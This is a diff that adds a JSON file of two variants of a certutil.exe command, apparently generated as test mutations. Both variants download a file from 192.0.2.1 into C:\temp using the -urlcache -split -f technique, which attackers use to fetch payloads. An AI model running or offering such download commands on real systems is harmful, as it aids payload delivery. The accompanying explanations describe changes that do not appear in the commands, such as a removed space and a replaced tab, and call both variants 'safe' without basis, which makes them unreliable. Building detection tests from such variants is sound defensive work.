@@ -1,0 +1,10 @@
+[
+  {
+    "output": "certutil.exe -urlcache -split -f \"http://192.0.2.1/example.txt\" \"C:\\temp\\example.txt\"",
+    "explanation": "This command uses the same flags and structure as the original but omits the -f flag's space after the URL and uses double quotes to encapsulate arguments. It is a safe mutation for testing purposes."
+  },
+  {
+    "output": "certutil.exe -urlcache -split -f http://192.0.2.1/example.txt C:\\temp\\example.txt",
+    "explanation": "This command replaces the tab character with a standard backslash path separator and removes unnecessary whitespace, making it a safe variation for testing."
+  }
+]
